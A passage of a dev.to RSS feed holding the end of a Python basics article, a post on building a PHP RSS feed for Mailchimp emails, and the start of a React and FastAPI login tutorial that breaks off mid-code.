&lt;p&gt;In this article, we learned about maths operations, strings, variables, user input, In place operators, etc., and that marked the end of our &lt;strong&gt;Basic Python Concepts&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;There are thousands of things in a programming language and I don't mean that this article has covered every basic concept of Python but we've surely learned enough to move ahead and learn other topics and in the next article of the series we'll learn about &lt;strong&gt;Control Structures in Python&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Stay tuned.&lt;/p&gt;

</description>
      <category>python</category>
      <category>programming</category>
      <category>tutorial</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Automating the flow of blog posts to my email list with PHP ⚙️</title>
      <author>Kelvin Graddick</author>
      <pubDate>Fri, 24 Dec 2021 20:18:26 +0000</pubDate>
      <link>https://dev.to/kgcodes/automating-the-flow-of-blog-posts-to-my-email-list-with-php-3k2p</link>
      <guid>https://dev.to/kgcodes/automating-the-flow-of-blog-posts-to-my-email-list-with-php-3k2p</guid>
      <description>&lt;p&gt;A while back ⁣I decided that I wanted to &lt;strong&gt;automate the flow of blog posts to my email list&lt;/strong&gt; (which is basically nobody right now by the way 😅).&lt;/p&gt;

&lt;p&gt;I found that &lt;a href="//www.mailchimp.com"&gt;Mailchimp&lt;/a&gt; has a feature for &lt;strong&gt;automatically sending to an email list based on RSS feed&lt;/strong&gt; updates on a website.&lt;/p&gt;

&lt;p&gt;A &lt;a href="https://en.wikipedia.org/wiki/RSS"&gt;RSS (Rich Site Summary or Really Simple Syndication)&lt;/a&gt; is a web feed format that allows users and applications to access updates to websites in a standardized way.&lt;/p&gt;

&lt;p&gt;RSS feeds are usually generated for you in website builders and other tools but since my site was built from scratch I needed to make my own.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Here is what I needed to do:&lt;/strong&gt;&lt;br&gt;
— find the RSS feed XML format online&lt;br&gt;
— create a new PHP page on my website in the RSS format&lt;br&gt;
— dynamically populate the RSS feed items with my blog posts from the database&lt;br&gt;
— test the RSS feed page on a validator website&lt;br&gt;
— setup a RSS feed email campaign using the feed on Mailchimp&lt;br&gt;
— design/style the email template&lt;br&gt;
— send a test email to myself to verify&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---sE6pol5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xm04x6ey021ox3h8yfwz.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---sE6pol5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xm04x6ey021ox3h8yfwz.jpeg" alt="Automating the flow of blog posts to my email list with PHP" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VC9fmK-U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/amejh72jn1204ivlmwse.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VC9fmK-U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/amejh72jn1204ivlmwse.jpeg" alt="PHP script that generates a RSS feed based on my website's blog posts" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vHZfgh66--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l50bzqkq9eoik1cizuqe.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vHZfgh66--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l50bzqkq9eoik1cizuqe.jpeg" alt="Here is the generated RSS feed XML file. A user or application can subscribe for blog updates." width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--M5dZxc7K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d6uiu7i083lch759jj2z.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--M5dZxc7K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/d6uiu7i083lch759jj2z.jpeg" alt="Created an automatic email campaign using the RSS feed on MailChimp" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uWEMieE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lrz5lq4325y7nbp8vjwk.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uWEMieE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lrz5lq4325y7nbp8vjwk.jpeg" alt="Test email from RSS feed" width="880" height="1100"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That was a fun, quick project to work on for a few hours and saved me an exponential amount of time in the future. 💪🏾&lt;/p&gt;

&lt;p&gt;⁉️ Anyone have experience with RSS feeds or subscribe to any?&lt;/p&gt;

</description>
      <category>programming</category>
      <category>webdev</category>
      <category>tutorial</category>
      <category>php</category>
    </item>
    <item>
      <title>Login Authentication With React And FastAPI</title>
      <author>oyedeletemitope</author>
      <pubDate>Fri, 24 Dec 2021 20:17:43 +0000</pubDate>
      <link>https://dev.to/oyedeletemitope/login-authentication-with-react-and-fastapi-397b</link>
      <guid>https://dev.to/oyedeletemitope/login-authentication-with-react-and-fastapi-397b</guid>
      <description>&lt;h3&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h3&gt;

&lt;p&gt;In this tutorial, we'll be building a login authentication using React and FastApi. This will help show how we can use both packages for a login authentication process but before that, let's take at React and also what FastApi is.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-fastapi"&gt;
  &lt;/a&gt;
  What is FastApi
&lt;/h3&gt;

&lt;p&gt;FastAPI is a modern, fast (high-performance), web framework for building APIs with Python. It supports both synchronous and asynchronous actions, as well as data validation, authentication, and interactive API documentation, all of which are powered by OpenAPI. It comes with exciting features like:&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-is-react"&gt;
  &lt;/a&gt;
  What is React
&lt;/h3&gt;

&lt;p&gt;React is a user interface development library. It can construct full-stack apps by talking with a server/API and operates as an SPA (single page app) on the client. Because it is competent and directly equivalent to frameworks like Angular or Vue, React is frequently referred to as a frontend "framework".&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#requirements"&gt;
  &lt;/a&gt;
  Requirements
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Python installed.&lt;/li&gt;
&lt;li&gt;Basic knowledge of Javascript.&lt;/li&gt;
&lt;li&gt;Basic Knowledge of React.&lt;/li&gt;
&lt;li&gt;Knowledge on python is a plus.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;
  &lt;a href="#installing-fastapi"&gt;
  &lt;/a&gt;
  Installing FastAPI
&lt;/h4&gt;

&lt;p&gt;open up our terminal and cd into our &lt;code&gt;project folder&lt;/code&gt; and write the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;mkdir &lt;/span&gt;backend
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;cd&lt;/code&gt; into the just created folder and run the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install &lt;/span&gt;fastapi
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install&lt;/span&gt; &lt;span class="s2"&gt;"uvicorn[standard]"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;pip &lt;span class="nb"&gt;install &lt;/span&gt;pyjwt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;let's leave that for later and proceed with building our frontend.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#building-the-frontend"&gt;
  &lt;/a&gt;
  Building The Frontend
&lt;/h4&gt;

&lt;p&gt;let's create and app and install the following packages:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npx create-react-app frontend
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next we install the following packages:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install &lt;/span&gt;axios react-router-dom
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;After we've done that, navigate to &lt;code&gt;src/index.js&lt;/code&gt; and import &lt;code&gt;BrowserRouter&lt;/code&gt; :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;BrowserRouter&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router-dom&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We then have to replace the &lt;code&gt;React.StrictMode&lt;/code&gt; tags with this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;BrowserRouter&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;App&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/BrowserRouter&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;,
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now head over to &lt;code&gt;app.js&lt;/code&gt; and import this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;Routes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Route&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router-dom&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./login&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;Profile&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Inside our &lt;code&gt;return()&lt;/code&gt; lets delete our div and replace it with this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;App&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Routes&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!--&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;what&lt;/span&gt; &lt;span class="nx"&gt;are&lt;/span&gt; &lt;span class="nx"&gt;routes&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;react&lt;/span&gt;&lt;span class="o"&gt;-!&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Route&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;element&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Route&lt;/span&gt; &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="nx"&gt;element&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Profile&lt;/span&gt;&lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/Routes&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/div&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we are using the routes to the pages we'll be creating shortly. Next let's create a file called &lt;code&gt;Login.js&lt;/code&gt; in our &lt;code&gt;src&lt;/code&gt; folder and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll also create another file called &lt;code&gt;Profile.js&lt;/code&gt; and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Profile&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;profile&lt;/span&gt; &lt;span class="nx"&gt;page&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/h1&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now let's start our application:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm start
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1HpjrPa0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1b2a3tlgmltrfge0schq.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1HpjrPa0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1b2a3tlgmltrfge0schq.PNG" alt="login" width="589" height="407"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--BAsNSBy4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/33c6aeisc0u5788rsugn.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--BAsNSBy4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/33c6aeisc0u5788rsugn.PNG" alt="profile" width="499" height="452"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As you can see, our page is working fine (also check the profile page by adding &lt;code&gt;/profile&lt;/code&gt; to the url). Now that we're done with basics, let's proceed to setting up our authentication.&lt;/p&gt;

&lt;p&gt;Let's create a new file in our &lt;code&gt;src&lt;/code&gt; folder called &lt;code&gt;Auth.js&lt;/code&gt; and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useLocation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;Navigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router-dom&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;setToken&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;temitope&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;// make up your own token&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;localStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;temitope&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;RequireToken&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;children&lt;/span&gt;&lt;span class="p"&gt;}){&lt;/span&gt;

    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;auth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fetchToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;useLocation&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;auth&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Navigate&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt;&lt;span class="na"&gt;from&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="sr"&gt;/&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;;
&lt;/span&gt;    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;children&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we created variables setting our token, fetching and also requiring our token, so let's go back to our &lt;code&gt;app.js&lt;/code&gt; and import our token:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;RequireToken&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./Auth&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We'll be adding some things in our &lt;code&gt;app.js&lt;/code&gt;. In our &lt;code&gt;Route path="/profile"&lt;/code&gt; let's make changes to the element by adding our &lt;code&gt;RequireToken&lt;/code&gt; so our &lt;code&gt;Route path="/profile"&lt;/code&gt; should look like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Route&lt;/span&gt;
  &lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/profile&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;
  &lt;span class="nx"&gt;element&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;RequireToken&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Profile&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/RequireToken&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When we save this and go to our app we would see that our profile page is now protected and can only be accessed with a valid token. Now let's finish our login page with our login form. head over to login page clear all and paste this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useNavigate&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react-router&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
